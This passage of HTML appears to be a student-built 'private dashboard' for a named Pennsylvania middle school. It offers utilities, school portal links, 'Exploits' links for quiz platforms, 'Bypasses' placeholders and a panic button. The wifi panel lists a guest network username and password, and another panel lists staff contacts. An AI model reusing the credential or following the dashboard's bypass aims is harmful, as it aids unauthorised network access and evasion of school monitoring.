
    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Login Page Date/Time Box -->
  <div class="login-datetime-box" id="loginDateTimeBox">
    <div>
      <span>Current Time:</span> <span id="loginCurrentTime">00:00:00</span>
    </div>
    <div>
      <span>Current Date:</span> <span id="loginCurrentDate">--</span>
    </div>
    <label class="format-toggle">
        <span style="user-select:none;">24-hour format</span>
        <label class="switch">
          <input type="checkbox" id="toggle24HourFormat" />
          <span class="slider"></span>
        </label>
    </label>
  </div>

  <!-- Login Successful Loading Screen -->
  <div id="loginLoadingScreen" style="display:none;">
    <div class="rotating-box-container">
        <div class="rotating-box loading-3d-square">
            <div class="face front"></div>
            <div class="face back"></div>
            <div class="face right"></div>
            <div class="face left"></div>
            <div class="face top"></div>
            <div class="face bottom"></div>
        </div>
    </div>
    <div id="loginLoadingScreenText" style="font-family:'Courier New', monospace; font-size:1.5em; font-weight:bold; color:white; margin-top:10px;">Initializing Login Page...</div>
    <div id="codeAnimation"></div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar" id="dashboardQuickBar">
      <input type="search" id="dashboardSearchBar" placeholder="Search sections..." />
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Canvas</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="downloadActivityLogsBtn">⬇️ Download All Logs</button>
      <button id="settingsBtn">⚙️ Settings</button>
      <button id="keybindsBtn">⌨️ Keybinds</button>
      <button id="utilitiesBtn">⏱️ Utilities</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">🔄 Unit Converter</button>
      <button id="statsBtn">📈 Stats</button>
      <button id="mediaBtn">▶️ Media</button>
      <button id="remindersBtn">⏰ Reminders</button>
      <button id="activityLogsDashboardBtn">📝 Dashboard Logs</button>
      <button id="loginHistoryBtn">🔒 Login History</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <!-- Welcome Notification -->
    <div id="welcomeNotification"></div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarBox">
        <div class="panel-handle">Drag Me</div>
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        <div class="panel-handle">Drag Me</div>
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>

      <div class="box" id="randomFactBox">
        <div class="panel-handle">Drag Me</div>
        <h2>✨ Random Fact</h2>
        <p id="randomFactContent">Loading a fascinating fact...</p>
      </div>
      <div class="box" id="dailyQuoteBox">
        <div class="panel-handle">Drag Me</div>
        <h2>📜 Daily Quote</h2>
        <p id="dailyQuoteContent">"The only way to do great work is to love what you do." - Steve Jobs</p>
      </div>

    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" id="updatesBox" style="flex: 1 1 300px; min-width: 300px;">
        <div class="panel-handle">Drag Me</div>
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsBox" style="flex: 1 1 300px; min-width: 300px;">
        <div class="panel-handle">Drag Me</div>
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <!-- Group of quick access panels -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Handbooks</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Map</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Websites</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 Phone Directory</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 Cameras</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Info</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploits</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypasses</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard</button>
    </div>

    <!-- Information Panels Container -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="wifi-level-high">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="wifi-level-medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="wifi-level-low">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>
        
        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
        
        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="info-panel">
        <h2>⚙️ Settings</h2>
        <ul>
          <li>
            <span>Dashboard Theme:</span>
            <select id="themeSelect">
                <option value="dark-theme">Dark</option>
                <option value="light-theme">Light</option>
                <option value="blue-theme">Blue Accent</option>
            </select>
          </li>
          <li><span>Toggle Announcements:</span> <label class="switch"><input type="checkbox" id="toggleAnnouncements"><span class="slider"></span></label></li>
          <li><span>Show Panel Drag Handles:</span> <label class="switch"><input type="checkbox" id="toggleDragHandles" checked><span class="slider"></span></label></li>
          <li><span>Display Welcome Notification:</span> <label class="switch"><input type="checkbox" id="toggleWelcomeNotification" checked><span class="slider"></span></label></li>
          <li><span>Clear Session Data (dummy):</span> <button class="small-btn" onclick="showNotification('Cleared session data.')">Clear</button></li>
          <li><span>Reset Dashboard Layout:</span> <button class="small-btn" id="resetLayoutBtn">Reset</button></li>
          <li><span>Auto Logout Inactive (mins):</span> <input type="number" placeholder="e.g. 30" id="autoLogoutInactive"></li>
          <li><span>Enable Keyboard Shortcuts:</span> <label class="switch"><input type="checkbox" id="enableKeyboardShortcuts" checked><span class="slider"></span></label></li>
          <li><span>Notification Sound (dummy):</span> <label class="switch"><input type="checkbox" id="notificationSound"><span class="slider"></span></label></li>
          <li><span>Advanced Logging (dummy):</span> <label class="switch"><input type="checkbox" id="advancedLogging"><span class="slider"></span></label></li>
          <li><span>Performance Mode (dummy):</span> <label class="switch"><input type="checkbox" id="performanceMode"><span class="slider"></span></label></li>
          <li><span>Proxy Mode (requires refresh):</span> <label class="switch"><input type="checkbox" id="proxyMode"><span class="slider"></span></label></li>
          <li><span>About:</span> <button class="small-btn" onclick="alert('Private System GUI v1.5.6\nDeveloped for advanced users.')">View Info</button></li>
          <li><span>Help & Support:</span> <button class="small-btn" onclick="alert('Contact admin@privatesystem.org')">Get Help</button></li>
          <li><span>Feedback:</span> <button class="small-btn" onclick="prompt('Enter your feedback:', '')">Send Feedback</button></li>
        </ul>
      </div>

      <!-- Keybinds Panel -->
      <div id="keybindsPanel" class="info-panel">
        <h2>⌨️ Keybinds Configuration</h2>
        <p>Define custom keyboard shortcuts for quick actions.</p>
        <ul>
          <li><span>Toggle Notes:</span> <input type="text" value="Ctrl + Alt + N" placeholder="e.g. Ctrl + S" data-keybind-action="toggleNotes"></li>
          <li><span>Panic Button:</span> <input type="text" value="Shift + Escape" placeholder="e.g. F12" data-keybind-action="panic"></li>
          <li><span>Toggle Sections:</span> <input type="text" value="Ctrl + Space" placeholder="e.g. F2" data-keybind-action="toggleSections"></li>
          <li><span>Open Calculator:</span> <input type="text" value="Ctrl + Alt + C" data-keybind-action="openCalculator"></li>
          <li><span>Open Settings:</span> <input type="text" value="Ctrl + ," data-keybind-action="openSettings"></li>
          <li><span>Toggle Fullscreen:</span> <input type="text" value="F11" data-keybind-action="toggleFullscreen"></li>
          <li><span>Reload Page:</span> <input type="text" value="Ctrl + R" data-keybind-action="reloadPage"></li>
        </ul>
        <button id="saveKeybindsBtn" style="margin-top: 20px;">Save Keybinds</button>
        <p style="font-size: 0.8em; color: #ccc; margin-top: 10px;">To define, press keys in the input. Use Ctrl, Alt, Shift, Command.</p>
      </div>

      <!-- Utilities Panel -->
      <div id="utilitiesPanel" class="info-panel">
        <h2>⏱️ Utilities (Timer & Stopwatch)</h2>
        <h3>Stopwatch</h3>
        <p style="font-size:1.5em; font-weight:bold;">Time: <span id="stopwatchDisplay">00:00:00</span></p>
        <button id="stopwatchStart">Start</button>
        <button id="stopwatchStop">Stop</button>
        <button id="stopwatchReset">Reset</button>
        <h3 style="margin-top: 20px;">Countdown Timer</h3>
        <div style="display: flex; gap: 5px; justify-content: center; align-items: center; margin-bottom: 10px;">
          <input type="number" id="timerMinutes" placeholder="Minutes" value="5" min="0" max="999" style="width: 80px; text-align: right;">
          <span>:</span>
          <input type="number" id="timerSeconds" placeholder="Seconds" value="0" min="0" max="59" style="width: 80px; text-align: left;">
        </div>
        <p style="font-size:1.5em; font-weight:bold;">Time Left: <span id="timerDisplay">00:05:00</span></p>
        <button id="timerStart">Start</button>
        <button id="timerStop">Stop</button>
        <button id="timerReset">Reset</button>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>🧮 Calculator</h2>
        <div class="calculator-grid">
            <div class="calculator-display" id="calcDisplay">0</div>
            <button onclick="calculator.clear()">AC</button>
            <button onclick="calculator.deleteLast()">DEL</button>
            <button class="operator" onclick="calculator.appendOp('%')">%</button>
            <button class="operator" onclick="calculator.appendOp('/')">÷</button>
            <button onclick="calculator.appendNum('7')">7</button>
            <button onclick="calculator.appendNum('8')">8</button>
            <button onclick="calculator.appendNum('9')">9</button>
            <button class="operator" onclick="calculator.appendOp('*')">×</button>
            <button onclick="calculator.appendNum('4')">4</button>
            <button onclick="calculator.appendNum('5')">5</button>
            <button onclick="calculator.appendNum('6')">6</button>
            <button class="operator" onclick="calculator.appendOp('-')">-</button>
            <button onclick="calculator.appendNum('1')">1</button>
            <button onclick="calculator.appendNum('2')">2</button>
            <button onclick="calculator.appendNum('3')">3</button>
            <button class="operator" onclick="calculator.appendOp('+')">+</button>
            <button onclick="calculator.appendNum('0')">0</button>
            <button onclick="calculator.appendNum('.')">.</button>
            <button class="equal" onclick="calculator.calculate()">=</button>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>🔄 Unit Converter</h2>
        <p>Convert:</p>
        <div class="unit-converter-input-group">
            <input type="number" id="convertFromValue" value="1">
            <select id="convertFromUnit"></select>
            <span>to</span>
            <select id="convertToUnit"></select>
        </div>
        <button id="convertBtn">Convert</button>
        <div class="unit-converter-result" id="conversionResult">Result: --</div>

        <h3 style="margin-top:20px;">Conversion Type:</h3>
        <select id="conversionType" style="padding: 8px; border-radius: 5px; border: 1px solid #ddd; background: #333; color: white; width: 100%;">
            <option value="length">Length</option>
            <option value="mass">Mass</option>
            <option value="temperature">Temperature</option>
            <option value="volume">Volume</option>
            <option value="area">Area</option>
        </select>
      </div>

      <!-- Stats Panel -->
      <div id="statsPanel" class="info-panel">
        <h2>📈 User Statistics</h2>
        <div id="statsContent">
          <p>Total Clicks: <span id="statTotalClicks">0</span></p>
          <p>Buttons Pressed: <span id="statButtonsPressed">0</span></p>
          <p>Toggles Flipped: <span id="statTogglesFlipped">0</span></p>
          <p>Panels Opened: <span id="statPanelsOpened">0</span></p>
          <p>Panels Closed: <span id="statPanelsClosed">0</span></p>
          <p>Notes Saved: <span id="statNotesSaved">0</span></p>
          <p>Screenshots Taken: <span id="statScreenshotsTaken">0</span></p>
          <p>Timer Starts: <span id="statTimerStarts">0</span></p>
          <p>Stopwatch Starts: <span id="statStopwatchStarts">0</span></p>
          <p>Conversions Made: <span id="statConversionsMade">0</span></p>
          <p>Searches Made: <span id="statSearchesMade">0</span></p>
        </div>
        <button id="resetStatsBtn" style="margin-top: 20px; background-color: #f44336;">Reset Statistics</button>
      </div>

      <!-- Media Panel -->
      <div id="mediaPanel" class="info-panel">
        <h2>▶️ Media Hub</h2>
        <p>Please note: Direct proxy integration is not available in this client-side dashboard for security and technical reasons. Links below are direct or embeds.</p>
        <h3>Featured Videos</h3>
        <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px;">
            <div style="flex: 1 1 300px; min-width: 280px; background: #333; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">
